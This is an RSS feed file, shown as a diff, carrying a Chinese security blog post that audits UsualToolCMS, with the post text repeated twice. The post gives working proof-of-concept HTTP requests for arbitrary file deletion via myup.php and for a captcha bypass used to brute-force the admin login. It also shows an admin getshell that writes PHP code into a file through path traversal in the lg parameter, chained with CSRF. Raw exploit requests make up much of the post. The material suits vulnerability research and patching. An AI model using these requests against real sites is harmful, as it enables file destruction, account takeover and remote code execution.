@@ -1,0 +1,152 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Uscms on Ca1s1&#39;Blog</title>
+    <link>https://vuln.top/tags/uscms/</link>
+    <description>Recent content in Uscms on Ca1s1&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 18 Jul 2019 11:24:30 +0800</lastBuildDate><atom:link href="https://vuln.top/tags/uscms/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Uscms代码审计</title>
+      <link>https://vuln.top/posts/uscms/</link>
+      <pubDate>Thu, 18 Jul 2019 11:24:30 +0800</pubDate>
+      
+      <guid>https://vuln.top/posts/uscms/</guid>
+      <description>&lt;h1 id=&#34;0x01-第一处前台任意文件删除&#34;&gt;0x01 第一处：前台任意文件删除&lt;/h1&gt;
+&lt;p&gt;漏洞信息：前台myup.php文件最后一段存在任意文件删除
+代码：&lt;/p&gt;
+&lt;p&gt;漏洞点：http://xxx/myup.php&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;第47行只对&lt;code&gt;..&lt;/code&gt;做了过滤,我仍然能任意删除网站内的文件，直接构造poc,&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Burp POC：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /UsualToolCMS/myup.php HTTP/1.1
+Host: 192.168.235.242
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+X-Forwarded-For: 8.8.8.8
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+
+get=delimg&amp;amp;imgurl=./1.php
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;0x02-绕过后台验证码爆破&#34;&gt;0x02 绕过后台验证码爆破&lt;/h1&gt;
+&lt;p&gt;漏洞点:http://xxx.xxx.xxx.xxx/cmsadmin/
+后台登陆时默认需要输入验证码，但是当我把验证码的参数ucode删除时，登陆依然成功&lt;/p&gt;
+&lt;p&gt;1.默认情况下登陆数据包&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-1.png&#34; alt=&#34;2-1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-2.png&#34; alt=&#34;2-2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;删除ucode参数和cookie后登陆，直接登陆成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-3.png&#34; alt=&#34;2-3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;通过burp爆破后台密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-4.png&#34; alt=&#34;2-4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-5.png&#34; alt=&#34;2-5&#34;&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /UsualToolCMS/cmsadmin/a_login.php?do=login HTTP/1.1
+Host: 192.168.235.242
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_login.php
+X-Forwarded-For: 8.8.8.8
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 23
+
+uuser=admin&amp;amp;upass=admin
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;0x03--后台getshell&#34;&gt;0x03  后台GETSHELL&lt;/h1&gt;
+&lt;p&gt;漏洞点:http://xxx.xxx.xxx.xxx/cmsadmin/a_lang.php
+13行未对$lg做判断&lt;/p&gt;</description>
+      <content>&lt;h1 id=&#34;0x01-第一处前台任意文件删除&#34;&gt;0x01 第一处：前台任意文件删除&lt;/h1&gt;
+&lt;p&gt;漏洞信息：前台myup.php文件最后一段存在任意文件删除
+代码：&lt;/p&gt;
+&lt;p&gt;漏洞点：http://xxx/myup.php&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;第47行只对&lt;code&gt;..&lt;/code&gt;做了过滤,我仍然能任意删除网站内的文件，直接构造poc,&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Burp POC：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /UsualToolCMS/myup.php HTTP/1.1
+Host: 192.168.235.242
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+X-Forwarded-For: 8.8.8.8
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+
+get=delimg&amp;amp;imgurl=./1.php
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;0x02-绕过后台验证码爆破&#34;&gt;0x02 绕过后台验证码爆破&lt;/h1&gt;
+&lt;p&gt;漏洞点:http://xxx.xxx.xxx.xxx/cmsadmin/
+后台登陆时默认需要输入验证码，但是当我把验证码的参数ucode删除时，登陆依然成功&lt;/p&gt;
+&lt;p&gt;1.默认情况下登陆数据包&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-1.png&#34; alt=&#34;2-1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-2.png&#34; alt=&#34;2-2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;删除ucode参数和cookie后登陆，直接登陆成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-3.png&#34; alt=&#34;2-3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;通过burp爆破后台密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-4.png&#34; alt=&#34;2-4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/2-5.png&#34; alt=&#34;2-5&#34;&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /UsualToolCMS/cmsadmin/a_login.php?do=login HTTP/1.1
+Host: 192.168.235.242
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_login.php
+X-Forwarded-For: 8.8.8.8
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 23
+
+uuser=admin&amp;amp;upass=admin
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;0x03--后台getshell&#34;&gt;0x03  后台GETSHELL&lt;/h1&gt;
+&lt;p&gt;漏洞点:http://xxx.xxx.xxx.xxx/cmsadmin/a_lang.php
+13行未对$lg做判断&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3-1.png&#34; alt=&#34;3-1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3-2.png&#34; alt=&#34;3-2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3-3.png&#34; alt=&#34;3-3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;点击保存时抓包需要修改url处的lg参数这样就上传到跟目录了，再在post 参数的en后面加入&lt;code&gt;en&amp;quot;},&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3-4.png&#34; alt=&#34;3-4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3-5.png&#34; alt=&#34;3-5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/3-6.png&#34; alt=&#34;3-6&#34;&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /UsualToolCMS/cmsadmin/a_langx.php?x=m&amp;amp;lg=../1.php HTTP/1.1
+Host: 192.168.235.242
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_langx.php?lg=lg-en.json
+Cookie: navleft=21; UTCMSLanguage=zh; PHPSESSID=1r5kk3jieflfbnseav3e5dnclo
+X-Forwarded-For: 8.8.8.8
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9189
+
+submit=%E4%BF%9D%E5%AD%98%E8%AF%AD%E8%A8%80%E5%8C%85&amp;amp;keys%5B%5D=language&amp;amp;values%5B%5D=en&amp;#34;},&amp;lt;?php phpinfo(); ?&amp;gt;&amp;amp;keys%5B%5D=charset&amp;amp;values%5B%5D=utf-8&amp;amp;keys%5B%5D=speak&amp;amp;values%5B%5D=English&amp;amp;keys%5B%5D=web&amp;amp;values%5B%5D=UsualToolCMS&amp;amp;key%5B%5D=index&amp;amp;value%5B%5D=Home&amp;amp;key%5B%5D=article&amp;amp;value%5B%5D=Article&amp;amp;key%5B%5D=product&amp;amp;value%5B%5D=Product&amp;amp;key%5B%5D=picture&amp;amp;value%5B%5D=Picture&amp;amp;key%5B%5D=atlas&amp;amp;value%5B%5D=Atlas&amp;amp;key%5B%5D=contact&amp;amp;value%5B%5D=Contact&amp;amp;key%5B%5D=about&amp;amp;value%5B%5D=About&amp;amp;key%5B%5D=forum&amp;amp;value%5B%5D=Forum&amp;amp;key%5B%5D=register&amp;amp;value%5B%5D=Register&amp;amp;key%5B%5D=login&amp;amp;value%5B%5D=Login&amp;amp;key%5B%5D=news&amp;amp;value%5B%5D=News&amp;amp;key%5B%5D=job&amp;amp;value%5B%5D=Job&amp;amp;key%5B%5D=wages&amp;amp;value%5B%5D=Wages&amp;amp;key%5B%5D=application&amp;amp;value%5B%5D=Application&amp;amp;key%5B%5D=resume&amp;amp;value%5B%5D=Resume&amp;amp;key%5B%5D=shopcart&amp;amp;value%5B%5D=Shopcart&amp;amp;key%5B%5D=account&amp;amp;value%5B%5D=Account&amp;amp;key%5B%5D=member&amp;amp;value%5B%5D=Member&amp;amp;key%5B%5D=up&amp;amp;value%5B%5D=Up&amp;amp;key%5B%5D=down&amp;amp;value%5B%5D=Down&amp;amp;key%5B%5D=more&amp;amp;value%5B%5D=More&amp;amp;key%5B%5D=new&amp;amp;value%5B%5D=New&amp;amp;key%5B%5D=authorize&amp;amp;value%5B%5D=Authorize&amp;amp;key%5B%5D=authenticating&amp;amp;value%5B%5D=Authenticating&amp;amp;key%5B%5D=qq&amp;amp;value%5B%5D=QQ&amp;amp;key%5B%5D=membercenter&amp;amp;value%5B%5D=Member&amp;amp;key%5B%5D=username&amp;amp;value%5B%5D=Username&amp;amp;key%5B%5D=password&amp;amp;value%5B%5D=Password&amp;amp;key%5B%5D=forgotpass&amp;amp;value%5B%5D=Forgot&amp;amp;key%5B%5D=search&amp;amp;value%5B%5D=Search&amp;amp;key%5B%5D=detail&amp;amp;value%5B%5D=Detail&amp;amp;key%5B%5D=size&amp;amp;value%5B%5D=Size&amp;amp;key%5B%5D=spec&amp;amp;value%5B%5D=Spec&amp;amp;key%5B%5D=color&amp;amp;value%5B%5D=Color&amp;amp;key%5B%5D=aboutus&amp;amp;value%5B%5D=About+Us&amp;amp;key%5B%5D=newgoods&amp;amp;value%5B%5D=New+Product&amp;amp;key%5B%5D=topgoods&amp;amp;value%5B%5D=Top+Product&amp;amp;key%5B%5D=link&amp;amp;value%5B%5D=Link&amp;amp;key%5B%5D=confirm&amp;amp;value%5B%5D=Confirm&amp;amp;key%5B%5D=email&amp;amp;value%5B%5D=Email&amp;amp;key%5B%5D=title&amp;amp;value%5B%5D=Title&amp;amp;key%5B%5D=content&amp;amp;value%5B%5D=Content&amp;amp;key%5B%5D=avatar&amp;amp;value%5B%5D=Avatar&amp;amp;key%5B%5D=sex&amp;amp;value%5B%5D=Sex&amp;amp;key%5B%5D=man&amp;amp;value%5B%5D=Man&amp;amp;key%5B%5D=woman&amp;amp;value%5B%5D=Woman&amp;amp;key%5B%5D=address&amp;amp;value%5B%5D=ADD.&amp;amp;key%5B%5D=tel&amp;amp;value%5B%5D=Tel&amp;amp;key%5B%5D=fax&amp;amp;value%5B%5D=Fax&amp;amp;key%5B%5D=introduction&amp;amp;value%5B%5D=Intro&amp;amp;key%5B%5D=validatecode&amp;amp;value%5B%5D=Captcha&amp;amp;key%5B%5D=changeit&amp;amp;value%5B%5D=Change+it&amp;amp;key%5B%5D=order&amp;amp;value%5B%5D=Order&amp;amp;key%5B%5D=writeorder&amp;amp;value%5B%5D=Write+Order&amp;amp;key%5B%5D=menu&amp;amp;value%5B%5D=Menu&amp;amp;key%5B%5D=balance&amp;amp;value%5B%5D=Balance&amp;amp;key%5B%5D=level&amp;amp;value%5B%5D=Level&amp;amp;key%5B%5D=writearticles&amp;amp;value%5B%5D=Write+Articles&amp;amp;key%5B%5D=articlemanagement&amp;amp;value%5B%5D=Article+Admin&amp;amp;key%5B%5D=articlebrowse&amp;amp;value%5B%5D=Article+Browse&amp;amp;key%5B%5D=writeonline&amp;amp;value%5B%5D=Add+New&amp;amp;key%5B%5D=payment&amp;amp;value%5B%5D=Payment&amp;amp;key%5B%5D=registrationtime&amp;amp;value%5B%5D=Reg+Time&amp;amp;key%5B%5D=lastlogintime&amp;amp;value%5B%5D=Last+Login&amp;amp;key%5B%5D=fullname&amp;amp;value%5B%5D=Full+Name&amp;amp;key%5B%5D=privileges%3Adiscount&amp;amp;value%5B%5D=Privileges%3ADiscount&amp;amp;key%5B%5D=state&amp;amp;value%5B%5D=State&amp;amp;key%5B%5D=source&amp;amp;value%5B%5D=Source&amp;amp;key%5B%5D=ordernumber&amp;amp;value%5B%5D=Order+No.&amp;amp;key%5B%5D=money&amp;amp;value%5B%5D=Money&amp;amp;key%5B%5D=time&amp;amp;value%5B%5D=Time&amp;amp;key%5B%5D=finish&amp;amp;value%5B%5D=Finish&amp;amp;key%5B%5D=unpaid&amp;amp;value%5B%5D=Unpaid&amp;amp;key%5B%5D=deliver&amp;amp;value%5B%5D=Deliver&amp;amp;key%5B%5D=refund&amp;amp;value%5B%5D=Refund&amp;amp;key%5B%5D=goods&amp;amp;value%5B%5D=Goods&amp;amp;key%5B%5D=charge&amp;amp;value%5B%5D=Charge&amp;amp;key%5B%5D=other&amp;amp;value%5B%5D=Other&amp;amp;key%5B%5D=ordertime&amp;amp;value%5B%5D=Order+Time&amp;amp;key%5B%5D=voucher&amp;amp;value%5B%5D=Voucher&amp;amp;key%5B%5D=customer&amp;amp;value%5B%5D=Customer&amp;amp;key%5B%5D=zipcode&amp;amp;value%5B%5D=Zip+Code&amp;amp;key%5B%5D=logistics&amp;amp;value%5B%5D=Logistics&amp;amp;key%5B%5D=logisticscompany&amp;amp;value%5B%5D=Company&amp;amp;key%5B%5D=logisticsnumber&amp;amp;value%5B%5D=Number&amp;amp;key%5B%5D=logisticsdetails&amp;amp;value%5B%5D=Details&amp;amp;key%5B%5D=paymentmethod&amp;amp;value%5B%5D=Method&amp;amp;key%5B%5D=alipay&amp;amp;value%5B%5D=Alipay&amp;amp;key%5B%5D=wechatpay&amp;amp;value%5B%5D=Tencent+Wechat&amp;amp;key%5B%5D=paypal&amp;amp;value%5B%5D=Paypal&amp;amp;key%5B%5D=waitinganswer&amp;amp;value%5B%5D=Waiting&amp;amp;key%5B%5D=answered&amp;amp;value%5B%5D=Answered&amp;amp;key%5B%5D=question&amp;amp;value%5B%5D=Question&amp;amp;key%5B%5D=reply&amp;amp;value%5B%5D=Reply&amp;amp;key%5B%5D=tencentaccount&amp;amp;value%5B%5D=Tencent&amp;amp;key%5B%5D=weiboaccount&amp;amp;value%5B%5D=Weibo&amp;amp;key%5B%5D=wechataccount&amp;amp;value%5B%5D=Wechat&amp;amp;key%5B%5D=binded&amp;amp;value%5B%5D=Binded&amp;amp;key%5B%5D=untie&amp;amp;value%5B%5D=Untie&amp;amp;key%5B%5D=quantity&amp;amp;value%5B%5D=Qty&amp;amp;key%5B%5D=parameter&amp;amp;value%5B%5D=Parm&amp;amp;key%5B%5D=total&amp;amp;value%5B%5D=Total&amp;amp;key%5B%5D=submit&amp;amp;value%5B%5D=Submit&amp;amp;key%5B%5D=delete&amp;amp;value%5B%5D=Del&amp;amp;key%5B%5D=unit&amp;amp;value%5B%5D=USD&amp;amp;key%5B%5D=actual&amp;amp;value%5B%5D=Actual&amp;amp;key%5B%5D=feedback&amp;amp;value%5B%5D=Feedback&amp;amp;key%5B%5D=otheraccount&amp;amp;value%5B%5D=Other+Accounts&amp;amp;key%5B%5D=out&amp;amp;value%5B%5D=Out&amp;amp;key%5B%5D=ranking&amp;amp;value%5B%5D=Ranking&amp;amp;key%5B%5D=recommend&amp;amp;value%5B%5D=Recommend&amp;amp;key%5B%5D=tag&amp;amp;value%5B%5D=Tag&amp;amp;key%5B%5D=tags&amp;amp;value%5B%5D=Tags&amp;amp;key%5B%5D=read&amp;amp;value%5B%5D=Read&amp;amp;key%5B%5D=productdetails&amp;amp;value%5B%5D=Product+Details&amp;amp;key%5B%5D=service&amp;amp;value%5B%5D=Service&amp;amp;key%5B%5D=category&amp;amp;value%5B%5D=Category&amp;amp;key%5B%5D=allcategory&amp;amp;value%5B%5D=All+Category&amp;amp;key%5B%5D=stock&amp;amp;value%5B%5D=Stock&amp;amp;key%5B%5D=price&amp;amp;value%5B%5D=Price&amp;amp;key%5B%5D=sale&amp;amp;value%5B%5D=Sale&amp;amp;key%5B%5D=loginview&amp;amp;value%5B%5D=Login+View&amp;amp;key%5B%5D=readme&amp;amp;value%5B%5D=Read+Me&amp;amp;key%5B%5D=popularity&amp;amp;value%5B%5D=Popularity&amp;amp;key%5B%5D=details&amp;amp;value%5B%5D=Details&amp;amp;key%5B%5D=message&amp;amp;value%5B%5D=Message&amp;amp;key%5B%5D=original&amp;amp;value%5B%5D=Original&amp;amp;key%5B%5D=author&amp;amp;value%5B%5D=Author&amp;amp;key%5B%5D=pass&amp;amp;value%5B%5D=Pass&amp;amp;key%5B%5D=audit&amp;amp;value%5B%5D=Audit&amp;amp;key%5B%5D=return&amp;amp;value%5B%5D=Return&amp;amp;key%5B%5D=yes&amp;amp;value%5B%5D=Yes&amp;amp;key%5B%5D=no&amp;amp;value%5B%5D=No&amp;amp;key%5B%5D=modify&amp;amp;value%5B%5D=Modify&amp;amp;key%5B%5D=articlemodify&amp;amp;value%5B%5D=Article+Modify&amp;amp;key%5B%5D=type&amp;amp;value%5B%5D=Type&amp;amp;key%5B%5D=moreupload&amp;amp;value%5B%5D=Up+to+upload&amp;amp;key%5B%5D=success&amp;amp;value%5B%5D=Success&amp;amp;key%5B%5D=fail&amp;amp;value%5B%5D=Fail&amp;amp;key%5B%5D=upload&amp;amp;value%5B%5D=Upload&amp;amp;key%5B%5D=uploadtime&amp;amp;value%5B%5D=Upload+Time&amp;amp;key%5B%5D=contactus&amp;amp;value%5B%5D=Contact+Us&amp;amp;key%5B%5D=previouspage&amp;amp;value%5B%5D=Prev&amp;amp;key%5B%5D=nextpage&amp;amp;value%5B%5D=Next&amp;amp;key%5B%5D=firstpage&amp;amp;value%5B%5D=First&amp;amp;key%5B%5D=lastpage&amp;amp;value%5B%5D=Last&amp;amp;key%5B%5D=totalpage&amp;amp;value%5B%5D=Total&amp;amp;key%5B%5D=currentpage&amp;amp;value%5B%5D=Current&amp;amp;key%5B%5D=buy&amp;amp;value%5B%5D=Buy&amp;amp;key%5B%5D=mailverify&amp;amp;value%5B%5D=Email+validation&amp;amp;key%5B%5D=welcome&amp;amp;value%5B%5D=Welcome&amp;amp;key%5B%5D=close&amp;amp;value%5B%5D=closed&amp;amp;key%5B%5D=findpassword&amp;amp;value%5B%5D=Find+Password&amp;amp;key%5B%5D=contactmanager&amp;amp;value%5B%5D=Contact+Manager&amp;amp;key%5B%5D=orderdetaillogin&amp;amp;value%5B%5D=For+order+details%2Cplease+visit+the+website.&amp;amp;key%5B%5D=enterusername&amp;amp;value%5B%5D=Please+enter+username%21&amp;amp;key%5B%5D=enterpassword&amp;amp;value%5B%5D=Please+enter+password%21&amp;amp;key%5B%5D=enteremail&amp;amp;value%5B%5D=Please+enter+Email%21&amp;amp;key%5B%5D=emailerr&amp;amp;value%5B%5D=Email+error%21&amp;amp;key%5B%5D=entertitle&amp;amp;value%5B%5D=Please+enter+title%21&amp;amp;key%5B%5D=entercontent&amp;amp;value%5B%5D=Please+enter+content%21&amp;amp;key%5B%5D=selecttype&amp;amp;value%5B%5D=Type+must+be+selected%21&amp;amp;key%5B%5D=enterauthor&amp;amp;value%5B%5D=Please+enter+author%21&amp;amp;key%5B%5D=enterpasswords&amp;amp;value%5B%5D=Please+confirm+the+password%21&amp;amp;key%5B%5D=passworderr&amp;amp;value%5B%5D=The+codes+don&amp;amp;key%5B%5D=entercaptcha&amp;amp;value%5B%5D=Please+enter+captcha%21&amp;amp;key%5B%5D=captchaerr&amp;amp;value%5B%5D=Captcha+error%21&amp;amp;key%5B%5D=mailsenderr&amp;amp;value%5B%5D=Mail+not+sent%21&amp;amp;key%5B%5D=mailok&amp;amp;value%5B%5D=Please+check+email%21&amp;amp;key%5B%5D=pleasemailverify&amp;amp;value%5B%5D=Please+check+email+for+verification%21&amp;amp;key%5B%5D=mailverifycode&amp;amp;value%5B%5D=Email+Authentication+Code&amp;amp;key%5B%5D=mailcopylink&amp;amp;value%5B%5D=Please+copy+the+following+link&amp;amp;key%5B%5D=totalnum&amp;amp;value%5B%5D=Total+Num&amp;amp;key%5B%5D=updateok&amp;amp;value%5B%5D=Update+successed%21&amp;amp;key%5B%5D=updateno&amp;amp;value%5B%5D=Failed+to+update%21&amp;amp;key%5B%5D=payok&amp;amp;value%5B%5D=Successful+payment%21&amp;amp;key%5B%5D=payno&amp;amp;value%5B%5D=Payment+Failed%21&amp;amp;key%5B%5D=createempty&amp;amp;value%5B%5D=Required+field+is+empty%21&amp;amp;key%5B%5D=createok&amp;amp;value%5B%5D=Create+successed%21&amp;amp;key%5B%5D=createno&amp;amp;value%5B%5D=Failed+to+create%21&amp;amp;key%5B%5D=gotopay&amp;amp;value%5B%5D=Go+to+pay%21&amp;amp;key%5B%5D=untieok&amp;amp;value%5B%5D=Untie+successed%21&amp;amp;key%5B%5D=untieno&amp;amp;value%5B%5D=Untie+failed%21&amp;amp;key%5B%5D=delok&amp;amp;value%5B%5D=Delete+successed%21&amp;amp;key%5B%5D=delno&amp;amp;value%5B%5D=Delete+failed%21&amp;amp;key%5B%5D=regclose&amp;amp;value%5B%5D=Website+registration+closed%21&amp;amp;key%5B%5D=regmailerr&amp;amp;value%5B%5D=Account+or+email+registered%21&amp;amp;key%5B%5D=loginusererr&amp;amp;value%5B%5D=Account+does+not+exist%21&amp;amp;key%5B%5D=loginpasserr&amp;amp;value%5B%5D=Account+or+password+does+not+match%21&amp;amp;key%5B%5D=administratorreply&amp;amp;value%5B%5D=The+administrator+has+not+responded%2C+please+wait+patiently.&amp;amp;key%5B%5D=noscript&amp;amp;value%5B%5D=Sorry%2C+your+browser+disabled+JavaScript%2C+it+may+not+be+able+to+use+some+of+the+site&amp;amp;key%5B%5D=readmecontent&amp;amp;value%5B%5D=We+guarantee+that+the+outer+packing+of+the+goods+is+in+good+condition+at+the+time+of+shipment.+When+you+receive+the+goods%2C+please+carefully+check+whether+the+invoice+and+the+goods+are+consistent+with+the+delivery+order.+If+you+find+that+the+goods+are+missing+or+damaged%2C+please+contact+our+customer+service+department+on+the+spot+when+the+delivery+personnel+are+still+on+the+scene%3B+If+you+find+that+the+package+is+damaged+or+the+goods+are+damaged+in+transit%2C+please+point+out+and+refuse+to+accept+it+on+the+spot.+After+refusal%2C+please+call+our+customer+service.+If+you+have+signed+for+it+or+someone+else+has+signed+for+it%2C+you+will+be+considered+as+the+packaging%2C+quantity+and+content+of+the+goods.+I+will+not+be+able+to+accept.&amp;amp;key%5B%5D=copyright&amp;amp;value%5B%5D=Copyright&amp;amp;key%5B%5D=cssdisplay&amp;amp;value%5B%5D=none&amp;amp;key%5B%5D=test&amp;amp;value%5B%5D=Test
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;##CSRF配合上面的后台getshell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/4-1.png&#34; alt=&#34;4-1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/4-2.png&#34; alt=&#34;4-2&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
